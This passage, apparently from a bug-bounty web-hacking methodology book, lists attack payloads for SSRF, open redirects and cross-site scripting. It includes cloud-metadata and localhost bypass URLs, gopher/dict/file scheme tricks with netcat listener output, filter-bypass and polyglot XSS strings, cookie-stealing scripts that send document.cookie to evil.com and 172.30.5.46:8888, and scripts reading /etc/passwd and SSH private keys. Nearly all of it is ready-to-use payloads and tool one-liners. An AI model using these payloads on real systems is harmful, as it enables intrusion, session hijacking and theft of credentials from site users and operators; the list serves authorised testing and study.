http://google.com:80+&amp;@127.88.23.245:22/#+@google.com:80/
http://127.88.23.245:22/+&amp;@google.com:80#+@google.com:80/
http://google.com:80+&amp;@google.com:80#+@127.88.23.245:22/
http://127.88.23.245:22/?@google.com:80/
http://127.88.23.245:22/#@www.google.com:80/

# 301 responses:
https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg
https://ssrf.localdomain.pw/img-without-body-md/301-http-.i.jpg
https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg
https://ssrf.localdomain.pw/img-with-body-md/301-http-.i.jpg

# 301 json:
https://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json
https://ssrf.localdomain.pw/json-without-body-md/301-http-.j.json
https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json
https://ssrf.localdomain.pw/json-with-body-md/301-http-.j.json

# 301 csv:
https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv
https://ssrf.localdomain.pw/csv-without-body-md/301-http-.c.csv
https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv
https://ssrf.localdomain.pw/csv-with-body-md/301-http-.c.csv

# 301 xml:
https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml
https://ssrf.localdomain.pw/xml-without-body-md/301-http-.x.xml
https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml
https://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml

# 301 pdf:
https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf
https://ssrf.localdomain.pw/pdf-without-body-md/301-http-.p.pdf
https://ssrf.localdomain.pw/pdf-with-body/301-http-169.254.169.254:80-.p.pdf
https://ssrf.localdomain.pw/pdf-with-body-md/301-http-.p.pdf

# 30x custom:
https://ssrf.localdomain.pw/custom-30x/?code=332&amp;url=http://169.254.169.254/&amp;content-type=YXBwbGljYXRpb24vanNvbg==&amp;body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&amp;fakext=/j.json

# 20x custom:
https://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&amp;content-type=YXBwbGljYXRpb24vanNvbg==&amp;body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&amp;fakext=/j.json

# 201 custom:
https://ssrf.localdomain.pw/custom-201/?url=http://169.254.169.254/&amp;content-type=YXBwbGljYXRpb24vanNvbg==&amp;body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&amp;fakext=/j.json

# HTML iframe + URL bypass
http://ssrf.localdomain.pw/iframe/?proto=http&amp;ip=127.0.0.1&amp;port=80&amp;url=/

# SFTP
http://whatever.com/ssrf.php?url=sftp://evil.com:11111/

evil.com:$ nc -v -l 11111
Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
SSH-2.0-libssh2_1.4.2

# Dict
http://safebuff.com/ssrf.php?dict://attacker:11111/

evil.com:$ nc -v -l 11111
Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
CLIENT libcurl 7.40.0

# gopher
# http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php
&lt;?php
        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');
?&gt;

evil.com:# nc -v -l 12346
Listening on [0.0.0.0] (family 0, port 12346)
Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)
HI
Multiline
test

# TFTP
# http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET

evil.com:# nc -v -u -l 12346
Listening on [0.0.0.0] (family 0, port 12346)
TESTUDPPACKEToctettsize0blksize512timeout6

# file
http://safebuff.com/redirect.php?url=file:///etc/passwd

# ldap
http://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit

# SSRF Bypasses
?url=http://safesite.com&amp;site.com
?url=http://////////////site.com/
?url=http://site@com/account/edit.aspx
?url=http://site.com/account/edit.aspx
?url=http://safesite.com?.site.com
?url=http://safesite.com#.site.com
?url=http://safesite.com\.site.com/domain
?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
?url=https://192.10.10.3/
?url=https://192.10.10.2?.192.10.10.3/
?url=https://192.10.10.2#.192.10.10.3/
?url=https://192.10.10.2\.192.10.10.3/
?url=http://127.0.0.1/status/
?url=http://localhost:8000/status/
?url=http://site.com/domain.php
&lt;?php
header(‘Location: http://127.0.0.1:8080/status');
?&gt;

# Localhost bypasses
0
127.00.1
127.0.01
0.00.0
0.0.00
127.1.0.1
127.10.1
127.1.01
0177.1
0177.0001.0001
0x0.0x0.0x0.0x0
0000.0000.0000.0000
0x7f.0x0.0x0.0x1
0177.0000.0000.0001
0177.0001.0000..0001
0x7f.0x1.0x0.0x1
0x7f.0x1.0x1

# Blind SSRF
- Review Forms
- Contact Us
- Password fields
- Contact or profile info (Names, Addresses)
- User Agent

# SSRF through video upload
# https://hackerone.com/reports/1062888
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS

# SSRF in pdf rendering
&lt;svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500"&gt;
    &lt;g&gt;
        &lt;foreignObject width="800" height="500"&gt;
            &lt;body xmlns="http://www.w3.org/1999/xhtml"&gt;
                &lt;iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"&gt;&lt;/iframe&gt;
            &lt;/body&gt;
        &lt;/foreignObject&gt;
    &lt;/g&gt;
&lt;/svg&gt;
</code></pre>
<p>SSRF Bypasses</p>
<pre><code class="language-bash">http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
http://////////////site.com/
http://0000::1:80/
http://000330.0000072.0000326.00000343
http://000NaN.000NaN
http://0177.00.00.01
http://017700000001
http://0330.072.0326.0343
http://033016553343
http://0NaN
http://0NaN.0NaN
http://0x0NaN0NaN
http://0x7f000001/
http://0xd8.0x3a.0xd6.0xe3
http://0xd8.0x3a.0xd6e3
http://0xd8.0x3ad6e3
http://0xd83ad6e3
http://0xNaN.0xaN0NaN
http://0xNaN.0xNa0x0NaN
http://0xNaN.0xNaN
http://127.0.0.1/status/
http://127.1/
http://2130706433/
http://216.0x3a.00000000326.0xe3
http://3627734755
http://[::]:80/
http://localhost:8000/status/
http://NaN
http://safesite.com#.site.com
http://safesite.com&amp;site.com
http://safesite.com?.site.com
http://safesite.com\.site.com/domain
http://shmilon.0xNaN.undefined.undefined
http://site.com/account/edit.aspx
http://site.com/domain.php
http://site@com/account/edit.aspx
http://whitelisted@127.0.0.1
https://192.10.10.2#.192.10.10.3/
https://192.10.10.2?.192.10.10.3/
https://192.10.10.2\.192.10.10.3/
https://192.10.10.3/
https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
&lt;?php
header('Location: http://127.0.0.1:8080/status');
?&gt;

# Tool
# https://h.43z.one/ipconverter/
</code></pre>
<h2 id="mindmap"><a class="header" href="#mindmap">Mindmap</a></h2>
<p><img src="enumeration/web/../../.gitbook/assets/image%20(14).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="open-redirects"><a class="header" href="#open-redirects">Open redirects</a></h1>
<h2 id="tools-5"><a class="header" href="#tools-5">Tools</a></h2>
<pre><code class="language-bash">#https://github.com/devanshbatham/OpenRedireX
python3 openredirex.py -u "https://website.com/?url=FUZZ" -p payloads.txt --keyword FUZZ

#https://github.com/0xNanda/Oralyzer
python3 oralyzer.py -u https://website.com/redir?url=

# Payload generator
# https://gist.github.com/zPrototype/b211ae91e2b082420c350c28b6674170
</code></pre>
<h2 id="payloads"><a class="header" href="#payloads">Payloads</a></h2>
<pre><code class="language-bash"># Check for
=aHR0
=http
# https://github.com/m0chan/BugBounty/blob/master/OpenRedirectFuzzing.txt

https://web.com/r/?url=https://phising-malicious.com
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect

# Check redirects
https://url.com/redirect/?url=http://twitter.com/
http://www.theirsite.com@yoursite.com/
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
/http://twitter.com/
/\\twitter.com
/\/twitter.com
?c=.twitter.com/
/?redir=google。com
//google%E3%80%82com
//google%00.com
/%09/google.com
/%5cgoogle.com
//www.google.com/%2f%2e%2e
//www.google.com/%2e%2e
//google.com/
//google.com/%2f..
//\google.com
/\victim.com:80%40google.com
https://target.com///google.com//
# Remember url enconde the payloads!

# Search in Burp:
“=http” or “=aHR0”（base64 encode http）

# Fuzzing openredirect

# Intruder url open redirect
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}

# Valid URLs:
http(s)://evil.com
http(s):\\evil.com
//evil.com
///evil.com
/\evil.com
\/evil.com
/\/evil.com
\\evil.com
\/\evil.com
/ /evil.com
\ \evil.com

# Oneliner with gf
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="xss"><a class="header" href="#xss">XSS</a></h1>
<ul>
<li>Visit <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Portswigger</a></li>
</ul>
<p>Try XSS in every input field, host headers, url redirections, URI paramenters and file upload namefiles.</p>
<p>Actions: phising through iframe, cookie stealing, always try convert self to reflected.</p>
<h2 id="tools-6"><a class="header" href="#tools-6">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/hahwul/dalfox
dalfox url http://testphp.vulnweb.com/listproducts.php

# https://github.com/KathanP19/Gxss
# Replace every param value with word FUZZ
echo "https://target.com/some.php?first=hello&amp;last=world" | Gxss -c 100

# XSpear
gem install XSpear
XSpear -u 'https://web.com' -a
XSpear -u 'https://www.web.com/?q=123' --cookie='role=admin' -v 1 -a -b https://six2dez.xss.ht -t 20
XSpear -u "http://testphp.vulnweb.com/search.php?test=query" -p test -v 1

# Xira
# https://github.com/xadhrit/xira
python3 xira.py -u url

# Hosting XSS
# surge.sh
npm install --global surge
mkdir mypayload
cd mypayload
echo "alert(1)" &gt; payload.js
surge # It returns the url

# XSS vectors
https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45

# Payload list
https://github.com/m0chan/BugBounty/blob/master/xss-payload-list.txt

https://github.com/terjanq/Tiny-XSS-Payloads

# XSS to RCE
# https://github.com/shelld3v/JSshell

# Polyglots
# https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

# XSS browser
# https://github.com/RenwaX23/XSSTRON

# Blind
# https://github.com/hipotermia/vaya-ciego-nen
</code></pre>
<h3 id="oneliners"><a class="header" href="#oneliners">Oneliners</a></h3>
<pre><code class="language-bash"># WaybackUrls
echo "domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe -b https://six2dez.xss.ht
# Param discovery based
paramspider -d target.com &gt; /filepath/param.txt &amp;&amp; dalfox -b https://six2dez.xss.ht file /filepath/param.txt 
# Blind XSS
cat target_list.txt | waybackurls -no-subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | qsreplace -a | dalfox pipe -b https://six2dez.xss.ht
# Reflected XSS
echo "domain.com" | waybackurls | gf xss | kxss
</code></pre>
<h2 id="xss-recopilation"><a class="header" href="#xss-recopilation">XSS recopilation</a></h2>
<h3 id="basics"><a class="header" href="#basics">Basics</a></h3>
<pre><code class="language-markup"># Locators
'';!--"&lt;XSS&gt;=&amp;{()}

# 101
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;
&lt;script&gt;+-+-1-+-+alert(/xss/)&lt;/script&gt;
%3Cscript%3Ealert(0)%3C%2Fscript%3E
%253Cscript%253Ealert(0)%253C%252Fscript%253E
&lt;svg onload=alert(1)&gt;
"&gt;&lt;svg onload=alert(1)&gt;
&lt;iframe src="javascript:alert(1)"&gt;
"&gt;&lt;script src=data:&amp;comma;alert(1)//
&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
%5B'-alert(document.cookie)-'%5D
</code></pre>
<h3 id="by-tag"><a class="header" href="#by-tag">By tag</a></h3>
<pre><code class="language-markup"># Tag filter bypass
&lt;svg/onload=alert(1)&gt;
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;script     &gt;alert(1)&lt;/script&gt;
&lt;ScRipT&gt;alert(1)&lt;/sCriPt&gt;
&lt;%00script&gt;alert(1)&lt;/script&gt;
&lt;script&gt;al%00ert(1)&lt;/script&gt;

# HTML tags
&lt;img/src=x a='' onerror=alert(1)&gt;
&lt;IMG """&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;"&gt;
&lt;img src=`x`onerror=alert(1)&gt;
&lt;img src='/' onerror='alert("kalisa")'&gt;
&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
&lt;IMG onmouseover="alert('xxs')"&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
&lt;SCRIPT SRC=http:/evil.com/xss.js?&lt; B &gt;
"&gt;&lt;XSS&lt;test accesskey=x onclick=alert(1)//test
&lt;svg&gt;&lt;discard onbegin=alert(1)&gt;
&lt;script&gt;image = new Image(); image.src="https://evil.com/?c="+document.cookie;&lt;/script&gt;
&lt;script&gt;image = new Image(); image.src="http://"+document.cookie+"evil.com/";&lt;/script&gt;

# Other tags
&lt;BASE HREF="javascript:alert('XSS');//"&gt;
&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
&lt;xss id=x tabindex=1 onactivate=alert(1)&gt;&lt;/xss&gt;
&lt;xss onclick="alert(1)"&gt;test&lt;/xss&gt;
&lt;xss onmousedown="alert(1)"&gt;test&lt;/xss&gt;
&lt;body onresize=alert(1)&gt;”onload=this.style.width=‘100px’&gt;
&lt;xss id=x onfocus=alert(document.cookie)tabindex=1&gt;#x’;&lt;/script&gt;

# CharCode
&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;

# Input already in script tag
@domain.com"&gt;user+'-alert`1`-'@domain.com

# Scriptless
&lt;link rel=icon href="//evil?
&lt;iframe src="//evil?
&lt;iframe src="//evil?
&lt;input type=hidden type=image src="//evil?

# Unclosed Tags
&lt;svg onload=alert(1)//
</code></pre>
<h3 id="blind"><a class="header" href="#blind">Blind</a></h3>
<pre><code class="language-markup"># Blind XSS
# https://github.com/LewisArdern/bXSS
# https://github.com/ssl/ezXSS
# https://xsshunter.com/

# Blind XSS detection
# Xsshunter payload in every field
# Review forms
# Contact Us pages
# Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
# Address fields of e-commerce sites
# First or Last Name field while doing Credit Card Payments
# Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.
# Log Viewers
# Feedback Page
# Chat Applications
# Any app that requires user moderation
# Host header
# Why cancel subscription? forms
</code></pre>
<h3 id="bypasses"><a class="header" href="#bypasses">Bypasses</a></h3>
<pre><code class="language-markup"># No parentheses
&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;
&lt;script&gt;throw onerror=eval,'=alert\x281\x29'&lt;/script&gt;
&lt;script&gt;'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}&lt;/script&gt;
&lt;script&gt;location='javascript:alert\x281\x29'&lt;/script&gt;
&lt;script&gt;alert`1`&lt;/script&gt;
&lt;script&gt;new Function`X${document.location.hash.substr`1`}`&lt;/script&gt;

# No parentheses and no semicolons
&lt;script&gt;{onerror=alert}throw 1&lt;/script&gt;
&lt;script&gt;throw onerror=alert,1&lt;/script&gt;
&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;
&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;
&lt;script&gt;throw onerror=alert,'some string',123,'haha'&lt;/script&gt;

# No parentheses and no spaces:
&lt;script&gt;Function`X${document.location.hash.substr`1`}```&lt;/script&gt;

# Angle brackets HTML encoded (in an attribute)
“onmouseover=“alert(1)
‘-alert(1)-’

# If quote is escaped
‘}alert(1);{‘
‘}alert(1)%0A{‘
\’}alert(1);{//

# Embedded tab, newline, carriage return to break up XSS
&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;

# RegEx bypass
&lt;img src="X" onerror=top[8680439..toString(30)](1337)&gt;

# Other
&lt;svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))&gt;: base64 value which is alert(‘XSS’)
</code></pre>
<h3 id="encoded"><a class="header" href="#encoded">Encoded</a></h3>
<pre><code class="language-markup"># Unicode
&lt;script&gt;\u0061lert(1)&lt;/script&gt;
&lt;script&gt;\u{61}lert(1)&lt;/script&gt;
&lt;script&gt;\u{0000000061}lert(1)&lt;/script&gt;

# Hex
&lt;script&gt;eval('\x61lert(1)')&lt;/script&gt;

# HTML
&lt;svg&gt;&lt;script&gt;&amp;#97;lert(1)&lt;/script&gt;&lt;/svg&gt;
&lt;svg&gt;&lt;script&gt;&amp;#x61;lert(1)&lt;/script&gt;&lt;/svg&gt;
&lt;svg&gt;&lt;script&gt;alert&amp;NewLine;(1)&lt;/script&gt;&lt;/svg&gt;
&lt;svg&gt;&lt;script&gt;x="&amp;quot;,alert(1)//";&lt;/script&gt;&lt;/svg&gt;
\’-alert(1)//

# URL
&lt;a href="javascript:x='%27-alert(1)-%27';"&gt;XSS&lt;/a&gt;

# Double URL Encode
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E

# Unicode + HTML
&lt;svg&gt;&lt;script&gt;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x31;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x63;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x35;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x32;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x34;(1)&lt;/script&gt;&lt;/svg&gt;

# HTML + URL
&lt;iframe src="javascript:'&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;'"&gt;&lt;/iframe&gt;
</code></pre>
<h3 id="polyglots"><a class="header" href="#polyglots">Polyglots</a></h3>
<pre><code class="language-markup">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
--&gt;'"/&gt;&lt;/sCript&gt;&lt;deTailS open x="&gt;" ontoggle=(co\u006efirm)``&gt;
oNcliCk=alert(1)%20)//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;%5Cx3csVg/&lt;img/src/onerror=alert(2)&gt;%5Cx3e
javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'&gt;
javascript:alert();//&lt;img src=x:x onerror=alert(1)&gt;\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/template&gt;&lt;/select&gt;&lt;/script&gt;&lt;frame src=javascript:alert()&gt;&lt;svg onload=alert()&gt;&lt;!--
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;
"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;" &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;img/id="confirm&amp;lpar; 1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;&lt;img src="http: //i.imgur.com/P8mL8.jpg"&gt; 
￼￼```
%3C!%27/!%22/!\%27/\%22/ — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm1%20//%3E#
&lt;!'/!”/!\'/\"/ — !&gt;&lt;/Title/&lt;/script/&gt;&lt;Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm1 //&gt;#
jaVasCript:/-//*\/'/"/*/(/ */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/ — !&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
"&gt;&gt;
” &gt;&lt;/plaintext&gt;&lt;/|&gt;&lt;plaintext/onmouseover=prompt(1) &gt;prompt(1)@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;’ →” &gt; "&gt;&lt;/script&gt;alert(1)”&gt;&lt;img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;"&gt;
" onclick=alert(1)//&lt;button ' onclick=alert(1)//&gt; */ alert(1)//
?msg=&lt;img/src=`%00`%20onerror=this.onerror=confirm(1)
&lt;svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))&gt;
&lt;sVg/oNloAd=”JaVaScRiPt:/**\/*\’/”\eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”&gt; &lt;iframe src=jaVaScrIpT:eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))&gt;
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
'"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;"&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouse over=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;"&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;img/id="confirm&amp;lpar;1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;&lt;imgsrc="http://i.imgur.com/P8mL8.jpg"&gt;

# No parenthesis, back ticks, brackets, quotes, braces
a=1337,b=confirm,c=window,c.onerror=b;throw-a

# Another uncommon
'-(a=alert,b="_Y000!_",[b].find(a))-'

# Common XSS in HTML Injection
&lt;svg onload=alert(1)&gt;
&lt;/tag&gt;&lt;svg onload=alert(1)&gt;
"&gt;&lt;/tag&gt;&lt;svg onload=alert(1)&gt;
'onload=alert(1)&gt;&lt;svg/1='
'&gt;alert(1)&lt;/script&gt;&lt;script/1='
*/alert(1)&lt;/script&gt;&lt;script&gt;/*
*/alert(1)"&gt;'onload="/*&lt;svg/1='
`-alert(1)"&gt;'onload="`&lt;svg/1='
*/&lt;/script&gt;'&gt;alert(1)/*&lt;script/1='
p=&lt;svg/1='&amp;q='onload=alert(1)&gt;
p=&lt;svg 1='&amp;q='onload='/*&amp;r=*/alert(1)'&gt;
q=&lt;script/&amp;q=/src=data:&amp;q=alert(1)&gt;
&lt;script src=data:,alert(1)&gt;
# inline
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
# src attribute
javascript:alert(1)
# JS injection
'-alert(1)-'
'/alert(1)//
\'/alert(1)//
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
/alert(1)//\
/alert(1)}//\
${alert(1)}

# XSS onscroll
&lt;p style=overflow:auto;font-size:999px onscroll=alert(1)&gt;AAA&lt;x/id=y&gt;&lt;/p&gt;#y

# XSS filter bypasss polyglot:
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;
"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;" &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;img/id="confirm&amp;lpar; 1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;&lt;img src="http: //i.imgur.com/P8mL8.jpg"&gt; 

" &lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); &lt;/script&gt;
" &lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); &lt;/script&gt;

# GO SSTI
{{define "T1"}}&lt;script&gt;alert(1)&lt;/script&gt;{{end}} {{template "T1"}}`

# Some XSS exploitations
- host header injection through xss
add referer: batman 
hostheader: bing.com"&gt;script&gt;alert(document.domain)&lt;/script&gt;&lt;"
- URL redirection through xss
document.location.href="http://evil.com"
- phishing through xss - iframe injection
&lt;iframe src="http://evil.com" height="100" width="100"&gt;&lt;/iframe&gt;
- Cookie stealing through xss
https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
&lt;script&gt;var i=new Image;i.src="http://172.30.5.46:8888/?"+document.cookie;&lt;/script&gt;
&lt;img src=x onerror=this.src='http://172.30.5.46:8888/?'+document.cookie;&gt;
&lt;img src=x onerror="this.src='http://172.30.5.46:8888/?'+document.cookie; this.removeAttribute('onerror');"&gt;
-  file upload  through xss
upload a picturefile, intercept it, change picturename.jpg to xss paylaod using intruder attack
-  remote file inclusion (RFI) through xss
php?=http://brutelogic.com.br/poc.svg - xsspayload
- convert self xss to reflected one
copy response in a file.html -&gt; it will work

# XSS to SSRF
&lt;esi:include src="http://yoursite.com/capture" /&gt;

# XSS to LFI
&lt;script&gt;	x=new XMLHttpRequest;	x.onload=function(){		document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();&lt;/script&gt;

&lt;img src="xasdasdasd" onerror="document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;')"/&gt;
&lt;script&gt;document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;');&lt;/scrip&gt;
</code></pre>
<h2 id="xss-in-files"><a class="header" href="#xss-in-files">XSS in files</a></h2>
<pre><code class="language-markup"># XSS in filename:
"&gt;&lt;img src=x onerror=alert(document.domain)&gt;.gif

# XSS in metadata:
exiftool -FIELD=XSS FILE
exiftool -Artist=' "&gt;&lt;img src=1 onerror=alert(document.domain)&gt;' brute.jpeg
exiftool -Artist='"&gt;&lt;script&gt;alert(1)&lt;/script&gt;' dapos.jpeg

# XSS in GIF Magic Number:
